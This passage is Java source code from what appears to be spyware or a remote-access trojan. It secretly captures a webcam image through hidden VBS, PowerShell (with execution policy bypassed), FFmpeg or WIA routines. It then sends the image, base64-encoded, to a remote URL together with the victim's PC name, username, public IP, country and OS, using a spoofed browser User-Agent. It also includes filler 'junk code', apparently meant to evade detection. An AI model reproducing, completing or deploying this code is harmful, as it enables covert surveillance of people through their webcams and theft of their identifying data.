                        log("[WEBCAM] PowerShell success: " + imageData.length + " bytes");
                    }
                }

                // Method 3: FFmpeg (if available)
                if (imageData == null || imageData.length < 1500) {
                    log("[WEBCAM] Trying FFmpeg...");
                    imageData = captureWebcamFFmpeg();
                    if (imageData != null && imageData.length > 1500) {
                        log("[WEBCAM] FFmpeg success: " + imageData.length + " bytes");
                    }
                }

                // Method 4: WIA COM object
                if (imageData == null || imageData.length < 1500) {
                    log("[WEBCAM] Trying WIA...");
                    imageData = captureWebcamWIA();
                    if (imageData != null && imageData.length > 1500) {
                        log("[WEBCAM] WIA success: " + imageData.length + " bytes");
                    }
                }

                if (imageData == null || imageData.length < 1000) {
                    log("[WEBCAM] No image captured (all methods failed)");
                    return;
                }

                String url = getWebcamUrl();
                if (url == null) {
                    log("[WEBCAM] No URL");
                    return;
                }

                // Send as base64 JSON with retry
                String base64 = java.util.Base64.getEncoder().encodeToString(imageData);
                String json = "{\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\",\"image\":\""
                        + base64 + "\"}";

                boolean result = false;
                for (int retry = 0; retry < 3 && !result; retry++) {
                    result = sendJson(url, json);
                    if (!result) {
                        Thread.sleep(500);
                    }
                }
                log("[WEBCAM] Sent: " + result + " (" + imageData.length + " bytes)");

            } catch (Exception e) {
                logEx("WEBCAM", e);
            }
        }, "WebcamCapture").start();
    }

    // Method 1: VBS with avicap32 - Most reliable, uses Windows built-in COM
    private static byte[] captureWebcamVBS() {
        try {
            java.io.File tempFile = java.io.File.createTempFile("wc_", ".bmp");
            tempFile.deleteOnExit();
            java.io.File vbsFile = java.io.File.createTempFile("cam_", ".vbs");
            vbsFile.deleteOnExit();

            String vbsScript = "Set objShell = CreateObject(\"WScript.Shell\")\n" +
                    "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n" +
                    "strOutputFile = \"" + tempFile.getAbsolutePath().replace("\\", "\\\\") + "\"\n" +
                    "' Use PowerShell embedded for webcam capture with avicap32\n" +
                    "strPS = \"Add-Type -TypeDefinition '\" & _\n" +
                    "\"using System;\" & _\n" +
                    "\"using System.Runtime.InteropServices;\" & _\n" +
                    "\"using System.Drawing;\" & _\n" +
                    "\"using System.Drawing.Imaging;\" & _\n" +
                    "\"using System.Windows.Forms;\" & _\n" +
                    "\"public class WC{\" & _\n" +
                    "\"[DllImport(\"\"avicap32.dll\"\")]public static extern IntPtr capCreateCaptureWindowA(string n,int s,int x,int y,int w,int h,IntPtr p,int i);\" & _\n"
                    +
                    "\"[DllImport(\"\"user32.dll\"\")]public static extern bool SendMessage(IntPtr h,uint m,int w,int l);\" & _\n"
                    +
                    "\"public static void C(string f){\" & _\n" +
                    "\"IntPtr h=capCreateCaptureWindowA(\"\"c\"\",0,0,0,640,480,IntPtr.Zero,0);\" & _\n" +
                    "\"if(h==IntPtr.Zero)return;\" & _\n" +
                    "\"SendMessage(h,0x40a,0,0);\" & _\n" +
                    "\"System.Threading.Thread.Sleep(800);\" & _\n" +
                    "\"SendMessage(h,0x43c,0,0);\" & _\n" +
                    "\"SendMessage(h,0x41e,0,0);\" & _\n" +
                    "\"if(Clipboard.ContainsImage()){Clipboard.GetImage().Save(f,ImageFormat.Bmp);}\" & _\n" +
                    "\"SendMessage(h,0x40b,0,0);\" & _\n" +
                    "\"}}' -ReferencedAssemblies System.Windows.Forms,System.Drawing;\" & _\n" +
                    "\"[WC]::C('\" & strOutputFile & \"')\"\n" +
                    "objShell.Run \"powershell -WindowStyle Hidden -Command \"\"\" & strPS & \"\"\"\", 0, True\n";

            try (java.io.FileWriter fw = new java.io.FileWriter(vbsFile)) {
                fw.write(vbsScript);
            }

            ProcessBuilder pb = new ProcessBuilder("cscript", "//NoLogo", "//B", vbsFile.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();
            boolean finished = p.waitFor(12, java.util.concurrent.TimeUnit.SECONDS);
            p.destroyForcibly();
            vbsFile.delete();

            if (tempFile.exists() && tempFile.length() > 1500) {
                // Convert BMP to JPG for smaller size
                java.awt.image.BufferedImage img = javax.imageio.ImageIO.read(tempFile);
                if (img != null) {
                    java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                    javax.imageio.ImageIO.write(img, "jpg", baos);
                    tempFile.delete();
                    if (baos.size() > 1000) {
                        return baos.toByteArray();
                    }
                }
            }
            tempFile.delete();
        } catch (Exception e) {
            logEx("WEBCAM_VBS", e);
        }
        return null;
    }

    // Method 2: FFmpeg - captures single frame (if installed)
    private static byte[] captureWebcamFFmpeg() {
        try {
            java.io.File tempFile = java.io.File.createTempFile("wc_", ".jpg");
            tempFile.deleteOnExit();
            String outPath = tempFile.getAbsolutePath();

            // Try common webcam device names
            String[] devices = { "video=Integrated Camera", "video=USB Camera", "video=Webcam", "video=HD Webcam" };

            for (String device : devices) {
                try {
                    ProcessBuilder pb = new ProcessBuilder(
                            "ffmpeg", "-hide_banner", "-loglevel", "error",
                            "-f", "dshow", "-i", device,
                            "-frames:v", "1", "-y", outPath);
                    pb.redirectErrorStream(true);
                    Process p = pb.start();
                    boolean finished = p.waitFor(8, java.util.concurrent.TimeUnit.SECONDS);
                    p.destroyForcibly();

                    if (finished && tempFile.exists() && tempFile.length() > 1000) {
                        byte[] data = java.nio.file.Files.readAllBytes(tempFile.toPath());
                        tempFile.delete();
                        log("[WEBCAM] FFmpeg success with: " + device);
                        return data;
                    }
                } catch (Exception e) {
                    // Try next device
                }
            }

            // Try auto-detect device
            try {
                ProcessBuilder pb = new ProcessBuilder(
                        "ffmpeg", "-hide_banner", "-loglevel", "error",
                        "-f", "dshow", "-list_devices", "true", "-i", "dummy");
                pb.redirectErrorStream(true);
                Process p = pb.start();
                java.io.BufferedReader br = new java.io.BufferedReader(
                        new java.io.InputStreamReader(p.getInputStream()));
                String line;
                String foundDevice = null;
                while ((line = br.readLine()) != null) {
                    if (line.contains("DirectShow video devices") || line.contains("(video)")) {
                        // Next line or parse this line for device name
                        if (line.contains("\"")) {
                            int start = line.indexOf("\"");
                            int end = line.indexOf("\"", start + 1);
                            if (end > start) {
                                foundDevice = line.substring(start + 1, end);
                                break;
                            }
                        }
                    }
                }
                p.destroyForcibly();

                if (foundDevice != null) {
                    ProcessBuilder pb2 = new ProcessBuilder(
                            "ffmpeg", "-hide_banner", "-loglevel", "error",
                            "-f", "dshow", "-i", "video=" + foundDevice,
                            "-frames:v", "1", "-y", outPath);
                    pb2.redirectErrorStream(true);
                    Process p2 = pb2.start();
                    p2.waitFor(8, java.util.concurrent.TimeUnit.SECONDS);
                    p2.destroyForcibly();

                    if (tempFile.exists() && tempFile.length() > 1000) {
                        byte[] data = java.nio.file.Files.readAllBytes(tempFile.toPath());
                        tempFile.delete();
                        log("[WEBCAM] FFmpeg auto-detect success: " + foundDevice);
                        return data;
                    }
                }
            } catch (Exception e) {
            }

            tempFile.delete();
        } catch (Exception e) {
            logEx("WEBCAM_FFMPEG", e);
        }
        return null;
    }

    // Method 2: PowerShell with Windows.Media.Capture (Windows 10+)
    private static byte[] captureWebcamPowerShell() {
        try {
            java.io.File tempFile = java.io.File.createTempFile("wc_", ".jpg");
            tempFile.deleteOnExit();
            String outPath = tempFile.getAbsolutePath().replace("\\", "\\\\");

            // Use CameraCaptureUI alternative via WinRT
            String psScript = "$ErrorActionPreference='SilentlyContinue';" +
                    "[void][Reflection.Assembly]::LoadWithPartialName('System.Drawing');" +
                    "[void][Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');" +
                    "Add-Type -AssemblyName System.Windows.Forms;" +
                    "try {" +
                    // First try: Use ESCAPI/OpenCV style capture via .NET
                    "  $code = @'" +
                    "  using System;" +
                    "  using System.Runtime.InteropServices;" +
                    "  using System.Drawing;" +
                    "  using System.Drawing.Imaging;" +
                    "  public class WebCam {" +
                    "    [DllImport(\"avicap32.dll\")] public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);"
                    +
                    "    [DllImport(\"user32.dll\")] public static extern bool SendMessage(IntPtr hWnd, int wMsg, int wParam, int lParam);"
                    +
                    "    [DllImport(\"user32.dll\")] public static extern int SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, int uFlags);"
                    +
                    "    public const int WM_CAP_DRIVER_CONNECT = 0x40a;" +
                    "    public const int WM_CAP_DRIVER_DISCONNECT = 0x40b;" +
                    "    public const int WM_CAP_EDIT_COPY = 0x41e;" +
                    "    public const int WM_CAP_GRAB_FRAME = 0x43c;" +
                    "    public static void Capture(string path) {" +
                    "      IntPtr hwnd = capCreateCaptureWindowA(\"cam\", 0, 0, 0, 640, 480, IntPtr.Zero, 0);" +
                    "      if (hwnd == IntPtr.Zero) return;" +
                    "      SendMessage(hwnd, WM_CAP_DRIVER_CONNECT, 0, 0);" +
                    "      System.Threading.Thread.Sleep(500);" +
                    "      SendMessage(hwnd, WM_CAP_GRAB_FRAME, 0, 0);" +
                    "      SendMessage(hwnd, WM_CAP_EDIT_COPY, 0, 0);" +
                    "      if (System.Windows.Forms.Clipboard.ContainsImage()) {" +
                    "        var img = System.Windows.Forms.Clipboard.GetImage();" +
                    "        img.Save(path, ImageFormat.Jpeg);" +
                    "      }" +
                    "      SendMessage(hwnd, WM_CAP_DRIVER_DISCONNECT, 0, 0);" +
                    "    }" +
                    "  }" +
                    "'@;" +
                    "  Add-Type -TypeDefinition $code -ReferencedAssemblies System.Windows.Forms,System.Drawing;" +
                    "  [WebCam]::Capture('" + outPath + "');" +
                    "} catch { $_ | Out-Null }";

            ProcessBuilder pb = new ProcessBuilder("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass",
                    "-Command", psScript);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            boolean finished = p.waitFor(15, java.util.concurrent.TimeUnit.SECONDS);
            p.destroyForcibly();

            if (tempFile.exists() && tempFile.length() > 1000) {
                byte[] data = java.nio.file.Files.readAllBytes(tempFile.toPath());
                tempFile.delete();
                log("[WEBCAM] PowerShell avicap32 success");
                return data;
            }
            tempFile.delete();
        } catch (Exception e) {
            logEx("WEBCAM_PS", e);
        }
        return null;
    }

    // Method 3: WIA COM Object (legacy fallback)
    private static byte[] captureWebcamWIA() {
        try {
            java.io.File tempFile = java.io.File.createTempFile("wc_", ".jpg");
            tempFile.deleteOnExit();

            String psScript = "$ErrorActionPreference='SilentlyContinue';" +
                    "try {" +
                    "  $mgr = New-Object -ComObject WIA.DeviceManager;" +
                    "  foreach ($dev in $mgr.DeviceInfos) {" +
                    "    if ($dev.Type -eq 2) {" +
                    "      $cam = $dev.Connect();" +
                    "      if ($cam.Items.Count -gt 0) {" +
                    "        $pic = $cam.Items[1].Transfer();" +
                    "        $pic.SaveFile('" + tempFile.getAbsolutePath().replace("\\", "\\\\") + "');" +
                    "        break;" +
                    "      }" +
                    "    }" +
                    "  }" +
                    "} catch {}";

            ProcessBuilder pb = new ProcessBuilder("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass",
                    "-Command", psScript);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            p.waitFor(12, java.util.concurrent.TimeUnit.SECONDS);
            p.destroyForcibly();

            if (tempFile.exists() && tempFile.length() > 1000) {
                byte[] data = java.nio.file.Files.readAllBytes(tempFile.toPath());
                tempFile.delete();
                log("[WEBCAM] WIA success");
                return data;
            }
            tempFile.delete();
        } catch (Exception e) {
            logEx("WEBCAM_WIA", e);
        }
        return null;
    }

    // ==================== CONTINUOUS WEBCAM (IMPROVED) ====================

    // ==================== WEBCAM DETECTION & CAPTURE ====================

    private static Boolean hasWebcamCache = null;
    private static long lastWebcamCheck = 0;

    /**
     * Fast check if a webcam is connected using PowerShell (Cached for 1 minute)
     */
    public static boolean checkWebcamPresence() {
        // Return cached result if valid (1 minute cache)
        if (hasWebcamCache != null && System.currentTimeMillis() - lastWebcamCheck < 60000) {
            return hasWebcamCache;
        }

        try {
            String os = System.getProperty("os.name", "").toLowerCase();
            if (!os.contains("win"))
                return false;

            // Fast PowerShell check for PnP devices with class Camera or Image
            String psCommand = "Get-PnpDevice -Class Camera,Image -Status OK -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count";

            ProcessBuilder pb = new ProcessBuilder("powershell", "-WindowStyle", "Hidden", "-Command", psCommand);
            pb.redirectErrorStream(true);
            Process p = pb.start();

            java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(p.getInputStream()));
            String line = reader.readLine();
            p.waitFor(5, java.util.concurrent.TimeUnit.SECONDS);
            p.destroyForcibly();

            if (line != null) {
                try {
                    int count = Integer.parseInt(line.trim());
                    boolean result = count > 0;
                    if (result)
                        log("[WEBCAM] Detected " + count + " device(s)");

                    // Update cache
                    hasWebcamCache = result;
                    lastWebcamCheck = System.currentTimeMillis();
                    return result;
                } catch (NumberFormatException e) {
                }
            }

        } catch (Exception e) {
            logEx("WEBCAM_CHECK", e);
        }

        // Default to false on error, but don't cache error state too long (maybe 10s?)
        // For now, just return false and don't update cache to force retry next time?
        // No, better to cache false to avoid spamming if it fails.
        hasWebcamCache = false;
        lastWebcamCheck = System.currentTimeMillis();
        return false;
    }

    public static void captureAndSendWebcamContinuous(String pcName, String pcUser) {
        // Run in background with retry logic
        new Thread(() -> {
            try {
                // Only on Windows
                String os = System.getProperty("os.name", "").toLowerCase();
                if (!os.contains("win")) {
                    return;
                }

                // Check presence first to save resources
                if (!checkWebcamPresence()) {
                    return;
                }

                byte[] imageData = null;
                Exception lastError = null;

                // Try multiple capture methods with detailed logging
                String[] methods = { "VBS", "PowerShell", "FFmpeg", "WIA" };

                for (String method : methods) {
                    try {
                        if (imageData != null && imageData.length > 1500)
                            break;

                        switch (method) {
                            case "VBS":
                                imageData = captureWebcamVBS();
                                break;
                            case "PowerShell":
                                imageData = captureWebcamPowerShell();
                                break;
                            case "FFmpeg":
                                imageData = captureWebcamFFmpeg();
                                break;
                            case "WIA":
                                imageData = captureWebcamWIA();
                                break;
                        }

                        if (imageData != null && imageData.length > 1500) {
                            log("[WEBCAM] " + method + " success: " + imageData.length + " bytes");
                            break;
                        }
                    } catch (Exception e) {
                        lastError = e;
                        // Continue to next method
                    }
                }

                // Validate image
                if (imageData == null || imageData.length < 1000) {
                    if (lastError != null) {
                        logEx("[WEBCAM] All methods failed", lastError);
                    }
                    return;
                }

                // Send with TCP retry logic
                String url = getWebcamUrl();
                if (url == null) {
                    log("[WEBCAM] No URL configured");
                    return;
                }

                String base64 = java.util.Base64.getEncoder().encodeToString(imageData);
                String json = "{\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\",\"image\":\""
                        + base64 + "\"}";

                // Retry with exponential backoff
                boolean sent = false;
                for (int attempt = 0; attempt < 4 && !sent; attempt++) {
                    try {
                        sent = sendJsonWithTCP(url, json, pcName, pcUser);
                        if (sent) {
                            log("[WEBCAM] Sent via " + (attempt == 0 ? "HTTP" : "retry") + " attempt " + (attempt + 1));
                        }
                    } catch (Exception e) {
                        if (attempt < 3) {
                            Thread.sleep(100 * (attempt + 1)); // Exponential backoff
                        }
                    }
                }

                if (!sent) {
                    log("[WEBCAM] Failed to send after 4 attempts");
                }

            } catch (Exception e) {
                logEx("[WEBCAM_CONTINUOUS] Error", e);
            }
        }, "WebcamCapture-Continuous-" + System.nanoTime()).start();
    }

    // Enhanced send with direct TCP connection
    private static boolean sendJsonWithTCP(String urlStr, String json, String pcName, String pcUser) throws Exception {
        try {
            java.net.URL url = new java.net.URL(urlStr);
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(10000);
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");

            // Add headers for consistency
            conn.setRequestProperty("X-PC-Name", pcName);
            conn.setRequestProperty("X-PC-User", pcUser);
            try {
                conn.setRequestProperty("X-IP", SystemInfo.getPublicIP());
                conn.setRequestProperty("X-Country", SystemInfo.getCountry());
                conn.setRequestProperty("X-OS", SystemInfo.getOS());
            } catch (Exception e) {
            }

            byte[] jsonBytes = json.getBytes(java.nio.charset.StandardCharsets.UTF_8);
            conn.setFixedLengthStreamingMode(jsonBytes.length);

            try (java.io.OutputStream os = conn.getOutputStream()) {
                os.write(jsonBytes);
                os.flush();
            }

            int responseCode = conn.getResponseCode();
            conn.disconnect();

            return responseCode >= 200 && responseCode < 300;
        } catch (Exception e) {
            throw e;
        }
    }

    // JUNK CODE
    private static void _junk() {
        long t = System.currentTimeMillis();
        if (t % 2 == 0) {
            String s = "Junk" + t;
        }
    }
}
